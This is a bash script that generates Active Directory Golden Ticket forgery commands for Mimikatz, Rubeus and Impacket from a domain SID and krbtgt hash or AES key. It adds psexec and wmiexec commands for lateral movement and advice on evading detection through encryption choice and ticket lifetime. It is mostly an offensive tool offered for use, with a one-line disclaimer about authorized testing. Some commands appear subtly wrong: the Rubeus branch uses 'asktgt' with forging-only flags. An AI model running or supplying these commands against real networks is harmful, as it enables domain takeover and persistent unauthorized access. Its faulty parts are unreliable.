#!/bin/bash
# Golden Ticket Command Generator
# Generates Mimikatz, Rubeus, or Impacket commands for Golden Ticket creation

set -e

usage() {
    cat << EOF
Usage: $0 [OPTIONS]

Generate Golden Ticket commands for Active Directory penetration testing.

Options:
    --tool <tool>         Tool to use: mimikatz, rubeus, or impacket (required)
    --user <username>     Username to impersonate (required)
    --domain <domain>     Target domain (required)
    --sid <sid>           Domain SID (required)
    --krbtgt <hash>       NTLM hash of krbtgt account
    --aes256 <key>        AES256 key (preferred for OpSec)
    --id <rid>            User RID (default: 500)
    --groups <rids>       Group RIDs (default: 512)
    --lifetime <minutes>  Ticket lifetime in minutes (default: 600)
    --renewmax <minutes>  Max renewal time (default: 10080)
    --ptt                 Inject ticket into memory (Pass-the-Ticket)
    --help                Show this help message

Examples:
    $0 --tool mimikatz --user Administrator --domain corp.local --sid S-1-5-21-1234567890-1234567890-1234567890 --krbtgt 25b2076cda3bfd6209161a6c78a69c1c --ptt
    $0 --tool rubeus --user admin --domain corp.local --sid S-1-5-21-1234567890-1234567890-1234567890 --aes256 430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 --ptt
    $0 --tool impacket --user testuser --domain corp.local --sid S-1-5-21-1234567890-1234567890-1234567890 --krbtgt 25b2076cda3bfd6209161a6c78a69c1c
EOF
    exit 1
}

# Default values
TOOL=""
USER=""
DOMAIN=""
SID=""
KRBTGT=""
AES256=""
ID="500"
GROUPS="512"
LIFETIME="600"
RENEWMAX="10080"
PTT=""

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --tool)
            TOOL="$2"
            shift 2
            ;;
        --user)
            USER="$2"
            shift 2
            ;;
        --domain)
            DOMAIN="$2"
            shift 2
            ;;
        --sid)
            SID="$2"
            shift 2
            ;;
        --krbtgt)
            KRBTGT="$2"
            shift 2
            ;;
        --aes256)
            AES256="$2"
            shift 2
            ;;
        --id)
            ID="$2"
            shift 2
            ;;
        --groups)
            GROUPS="$2"
            shift 2
            ;;
        --lifetime)
            LIFETIME="$2"
            shift 2
            ;;
        --renewmax)
            RENEWMAX="$2"
            shift 2
            ;;
        --ptt)
            PTT="true"
            shift
            ;;
        --help)
            usage
            ;;
        *)
            echo "Unknown option: $1"
            usage
            ;;
    esac
done

# Validate required parameters
if [[ -z "$TOOL" || -z "$USER" || -z "$DOMAIN" || -z "$SID" ]]; then
    echo "Error: --tool, --user, --domain, and --sid are required"
    usage
fi

if [[ -z "$KRBTGT" && -z "$AES256" ]]; then
    echo "Error: Either --krbtgt or --aes256 is required"
    usage
fi

# Validate SID format
if [[ ! "$SID" =~ ^S-1-5-21-[0-9]+-[0-9]+-[0-9]+$ ]]; then
    echo "Warning: SID format may be invalid: $SID"
    echo "Expected format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"
fi

# Generate commands based on tool
case $TOOL in
    mimikatz)
        echo "=== Mimikatz Golden Ticket Command ==="
        echo ""
        echo "kerberos::golden \\\
  /User:$USER \\\
  /domain:$DOMAIN \\\
  /sid:$SID \\\
  /id:$ID \\\
  /groups:$GROUPS"
        
        if [[ -n "$KRBTGT" ]]; then
            echo "  /krbtgt:$KRBTGT"
        fi
        
        if [[ -n "$AES256" ]]; then
            echo "  /aes256:$AES256"
        fi
        
        echo "  /startoffset:0 \\\
  /endin:$LIFETIME \\\
  /renewmax:$RENEWMAX"
        
        if [[ -n "$PTT" ]]; then
            echo "  /ptt"
        else
            echo "  /ticket:golden.kirbi"
        fi
        echo ""
        echo "# Load ticket (if not using /ptt):"
        echo "kerberos::ptt golden.kirbi"
        echo ""
        echo "# List tickets:"
        echo "klist"
        ;;
        
    rubeus)
        echo "=== Rubeus Golden Ticket Command ==="
        echo ""
        echo ".\Rubeus.exe asktgt /user:$USER \\\
  /domain:$DOMAIN \\\
  /sid:$SID \\\
  /ldap \\\
  /printcmd"
        
        if [[ -n "$KRBTGT" ]]; then
            echo "  /rc4:$KRBTGT"
        fi
        
        if [[ -n "$AES256" ]]; then
            echo "  /aes256:$AES256"
        fi
        
        if [[ -n "$PTT" ]]; then
            echo "  /ptt"
        else
            echo "  /ticket:golden.kirbi"
        fi
        echo ""
        echo "# Load ticket (if not using /ptt):"
        echo ".\Rubeus.exe ptt /ticket:golden.kirbi"
        echo ""
        echo "# List tickets:"
        echo "klist"
        ;;
        
    impacket)
        echo "=== Impacket Golden Ticket Commands ==="
        echo ""
        echo "# Generate ticket:"
        echo "python ticketer.py -nthash $KRBTGT \\\
  -domain-sid $SID \\\
  -domain $DOMAIN \\\
  $USER"
        echo ""
        echo "# Export ticket:"
        echo "export KRB5CCNAME=/path/to/$USER.ccache"
        echo ""
        echo "# Use with psexec:"
        echo "python psexec.py $DOMAIN/$USER@<target> -k -no-pass"
        echo ""
        echo "# Use with wmiexec:"
        echo "python wmiexec.py -k -no-pass $DOMAIN/$USER@<target>"
        ;;
        
    *)
        echo "Error: Unknown tool '$TOOL'"
        echo "Valid options: mimikatz, rubeus, impacket"
        exit 1
        ;;
esac

echo ""
echo "=== Security Notes ==="
echo "- AES encryption is preferred over RC4/NTLM for operational security"
echo "- Default 10-year ticket lifetime is highly detectable"
echo "- Consider using realistic lifetimes (e.g., 600 minutes = 10 hours)"
echo "- Monitor for Event 4769 without prior Event 4768"
echo "- Only use in authorized penetration testing engagements"
